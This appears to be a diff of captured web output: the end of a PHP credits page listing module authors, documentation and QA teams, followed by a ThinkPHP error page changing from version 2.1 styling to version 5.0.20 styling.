 <tr><td class="e">SQLite 3.x driver for PDO </td><td class="v">Wez Furlong </td></tr>
 <tr><td class="e">SQLite3 </td><td class="v">Scott MacVicar, Ilia Alshanetsky, Brad Dewar </td></tr>
-<tr><td class="e">Sybase-CT </td><td class="v">Zeev Suraski, Tom May, Timm Friebe </td></tr>
 <tr><td class="e">System V Message based IPC </td><td class="v">Wez Furlong </td></tr>
 <tr><td class="e">System V Semaphores </td><td class="v">Tom May </td></tr>
 <tr><td class="e">System V Shared Memory </td><td class="v">Christian Cartus </td></tr>
@@ -914,29 +962,29 @@ Phar based on pear/PHP_Archive, original concept by Davey Shafik.<br />Phar full
 <tr><td class="e">xmlrpc </td><td class="v">Dan Libby </td></tr>
 <tr><td class="e">XMLWriter </td><td class="v">Rob Richards, Pierre-Alain Joye </td></tr>
 <tr><td class="e">XSL </td><td class="v">Christian Stocker, Rob Richards </td></tr>
-<tr><td class="e">Zip </td><td class="v">Pierre-Alain Joye </td></tr>
+<tr><td class="e">Zip </td><td class="v">Pierre-Alain Joye, Remi Collet </td></tr>
 <tr><td class="e">Zlib </td><td class="v">Rasmus Lerdorf, Stefan Roehrich, Zeev Suraski, Jade Nicoletti, Michael Wallner </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th colspan="2">PHP Documentation</th></tr>
-<tr><td class="e">Authors </td><td class="v">Mehdi Achour, Friedhelm Betz, Antony Dovgal, Nuno Lopes, Hannes Magnusson, Georg Richter, Damien Seguy, Jakub Vrana </td></tr>
-<tr><td class="e">Editor </td><td class="v">Philip Olson </td></tr>
+<tr><td class="e">Authors </td><td class="v">Mehdi Achour, Friedhelm Betz, Antony Dovgal, Nuno Lopes, Hannes Magnusson, Philip Olson, Georg Richter, Damien Seguy, Jakub Vrana, Adam Harvey </td></tr>
+<tr><td class="e">Editor </td><td class="v">Peter Cowburn </td></tr>
 <tr><td class="e">User Note Maintainers </td><td class="v">Daniel P. Brown, Thiago Henrique Pojda </td></tr>
 <tr><td class="e">Other Contributors </td><td class="v">Previously active authors, editors and other contributors are listed in the manual. </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>PHP Quality Assurance Team</th></tr>
-<tr><td class="e">Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Jani Taskinen, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Jani Taskinen, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs </td></tr>
+</table>
+<table>
 <tr class="h"><th colspan="2">Websites and Infrastructure team</th></tr>
-<tr><td class="e">PHP Websites Team </td><td class="v">Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen </td></tr>
+<tr><td class="e">PHP Websites Team </td><td class="v">Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison </td></tr>
 <tr><td class="e">Event Maintainers </td><td class="v">Damien Seguy, Daniel P. Brown </td></tr>
 <tr><td class="e">Network Infrastructure </td><td class="v">Daniel P. Brown </td></tr>
 <tr><td class="e">Windows Infrastructure </td><td class="v">Alex Schoenmaker </td></tr>
-</table><br />
+</table>
 <h2>PHP License</h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="v"><td>
 <p>
 This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
@@ -946,68 +994,256 @@ This program is free software; you can redistribute it and/or modify it under th
 <p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
 </p>
 </td></tr>
-</table><br />
-</div></body></html><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+</table>
+</div></body></html><!DOCTYPE html>
+<html>
 <head>
-<title>系统发生错误</title>
-<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
-<meta name="Generator" content="EditPlus"/>
-<style>
-body{
-	font-family: 'Microsoft Yahei', Verdana, arial, sans-serif;
-	font-size:14px;
-}
-a{text-decoration:none;color:#174B73;}
-a:hover{ text-decoration:none;color:#FF6600;}
-h2{
-	border-bottom:1px solid #DDD;
-	padding:8px 0;
-    font-size:25px;
-}
-.title{
-	margin:4px 0;
-	color:#F60;
-	font-weight:bold;
-}
-.message,#trace{
-	padding:1em;
-	border:solid 1px #000;
-	margin:10px 0;
-	background:#FFD;
-	line-height:150%;
-}
-.message{
-	background:#FFD;
-	color:#2E2E2E;
-		border:1px solid #E0E0E0;
-}
-#trace{
-	background:#E7F7FF;
-	border:1px solid #E0E0E0;
-	color:#535353;
-}
-.notice{
-    padding:10px;
-	margin:5px;
-	color:#666;
-	background:#FCFCFC;
-	border:1px solid #E0E0E0;
-}
-.red{
-	color:red;
-	font-weight:bold;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>System Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <style>
+        /* Base */
+        body {
+            color: #333;
+            font: 14px Verdana, "Helvetica Neue", helvetica, Arial, 'Microsoft YaHei', sans-serif;
+            margin: 0;
+            padding: 0 20px 20px;
+            word-break: break-word;
+        }
+        h1{
+            margin: 10px 0 0;
+            font-size: 28px;
+            font-weight: 500;
+            line-height: 32px;
+        }
+        h2{
+            color: #4288ce;
+            font-weight: 400;
+            padding: 6px 0;
+            margin: 6px 0 0;
+            font-size: 18px;
+            border-bottom: 1px solid #eee;
+        }
+        h3.subheading {
+            color: #4288ce;
+            margin: 6px 0 0;
+            font-weight: 400;
+        }
+        h3{
+            margin: 12px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        abbr{
+            cursor: help;
+            text-decoration: underline;
+            text-decoration-style: dotted;
+        }
+        a{
+            color: #868686;
+            cursor: pointer;
+        }
+        a:hover{
+            text-decoration: underline;
+        }
+        .line-error{
+            background: #f8cbcb;
+        }
+
+        .echo table {
+            width: 100%;
+        }
+
+        .echo pre {
+            padding: 16px;
+            overflow: auto;
+            font-size: 85%;
+            line-height: 1.45;
+            background-color: #f7f7f7;
+            border: 0;
+            border-radius: 3px;
+            font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+        }
+
+        .echo pre > pre {
+            padding: 0;
+            margin: 0;
+        }
+        /* Layout */
+        .col-md-3 {
+            width: 25%;
+        }
+        .col-md-9 {
+            width: 75%;
+        }
+        [class^="col-md-"] {
+            float: left;
+        }
+        .clearfix {
+            clear:both;
+        }
+        @media only screen 
+        and (min-device-width : 375px) 
+        and (max-device-width : 667px) { 
+            .col-md-3,
+            .col-md-9 {
+                width: 100%;
+            }
+        }
+        /* Exception Info */
+        .exception {
+            margin-top: 20px;
+        }
+        .exception .message{
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-bottom: 0 none;
+            line-height: 18px;
+            font-size:16px;
+            border-top-left-radius: 4px;
+            border-top-right-radius: 4px;
+            font-family: Consolas,"Liberation Mono",Courier,Verdana,"微软雅黑";
+        }
+
+        .exception .code{
+            float: left;
+            text-align: center;
+            color: #fff;
+            margin-right: 12px;
+            padding: 16px;
+            border-radius: 4px;
+            background: #999;
+        }
+        .exception .source-code{
+            padding: 6px;
+            border: 1px solid #ddd;
+
+            background: #f9f9f9;
+            overflow-x: auto;
+
+        }
+        .exception .source-code pre{
+            margin: 0;
+        }
+        .exception .source-code pre ol{
+            margin: 0;
+            color: #4288ce;
+            display: inline-block;
+            min-width: 100%;
+            box-sizing: border-box;
+        font-size:14px;
+            font-family: "Century Gothic",Consolas,"Liberation Mono",Courier,Verdana;
+            padding-left: 40px;
+        }
+        .exception .source-code pre li{
+            border-left: 1px solid #ddd;
+            height: 18px;
+            line-height: 18px;
+        }
+        .exception .source-code pre code{
+            color: #333;
+            height: 100%;
+            display: inline-block;
+            border-left: 1px solid #fff;
+        font-size:14px;
+            font-family: Consolas,"Liberation Mono",Courier,Verdana,"微软雅黑";
+        }
+        .exception .trace{
+            padding: 6px;
+            border: 1px solid #ddd;
+            border-top: 0 none;
+            line-height: 16px;
+        font-size:14px;
+            font-family: Consolas,"Liberation Mono",Courier,Verdana,"微软雅黑";
+        }
+        .exception .trace ol{
+            margin: 12px;
+        }
+        .exception .trace ol li{
+            padding: 2px 4px;
+        }
+        .exception div:last-child{
+            border-bottom-left-radius: 4px;
+            border-bottom-right-radius: 4px;
+        }
+
+        /* Exception Variables */
+        .exception-var table{
+            width: 100%;
+            margin: 12px 0;
+            box-sizing: border-box;
+            table-layout:fixed;
+            word-wrap:break-word;            
+        }
+        .exception-var table caption{
+            text-align: left;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 6px 0;
+        }
+        .exception-var table caption small{
+            font-weight: 300;
+            display: inline-block;
+            margin-left: 10px;
+            color: #ccc;
+        }
+        .exception-var table tbody{
+            font-size: 13px;
+            font-family: Consolas,"Liberation Mono",Courier,"微软雅黑";
+        }
+        .exception-var table td{
+            padding: 0 6px;
+            vertical-align: top;
+            word-break: break-all;
+        }
+        .exception-var table td:first-child{
+            width: 28%;
+            font-weight: bold;
+            white-space: nowrap;
+        }
+        .exception-var table td pre{
+            margin: 0;
+        }
+
+        /* Copyright Info */
+        .copyright{
+            margin-top: 24px;
+            padding: 12px 0;
+            border-top: 1px solid #eee;
+        }
+
+        /* SPAN elements with the classes below are added by prettyprint. */
+        pre.prettyprint .pln { color: #000 }  /* plain text */
+        pre.prettyprint .str { color: #080 }  /* string content */
+        pre.prettyprint .kwd { color: #008 }  /* a keyword */
+        pre.prettyprint .com { color: #800 }  /* a comment */
+        pre.prettyprint .typ { color: #606 }  /* a type name */
+        pre.prettyprint .lit { color: #066 }  /* a literal value */
+        /* punctuation, lisp open bracket, lisp close bracket */
+        pre.prettyprint .pun, pre.prettyprint .opn, pre.prettyprint .clo { color: #660 }
+        pre.prettyprint .tag { color: #008 }  /* a markup tag name */
+        pre.prettyprint .atn { color: #606 }  /* a markup attribute name */
+        pre.prettyprint .atv { color: #080 }  /* a markup attribute value */
+        pre.prettyprint .dec, pre.prettyprint .var { color: #606 }  /* a declaration; a variable name */
+        pre.prettyprint .fun { color: red }  /* a function name */
+    </style>
 </head>
 <body>
-<div class="notice">
-<h2>系统发生错误 </h2>
-<div >您可以选择 [ <A HREF="/index.php">重试</A> ] [ <A HREF="javascript:history.back()">返回</A> ] 或者 [ <A HREF="/index.php">回到首页</A> ]</div>
-<p class="title">[ 错误信息 ]</p>
-<p class="message">无法加载模块index</p>
-</div>
-<div align="center" style="color:#FF3300;margin:5pt;font-family:Verdana"> ThinkPHP <sup style='color:gray;font-size:9pt'>2.1</sup><span style='color:silver'> { Fast & Simple OOP PHP Framework } -- [ WE CAN DO IT JUST THINK IT ]</span>
-</div>
-</body>
+    <div class="echo">
+            </div>
+        <div class="exception">
+        
+            <div class="info"><h1>页面错误！请稍后再试～</h1></div>
+        
+    </div>
+        
+    
+    
+    <div class="copyright">
+        <a title="官方网站" href="http://www.thinkphp.cn">ThinkPHP</a> 
+        <span>V5.0.20</span> 
+        <span>{ 十年磨一剑-为API开发设计的高性能框架 }</span>
+    </div
+    </body>
 </html>
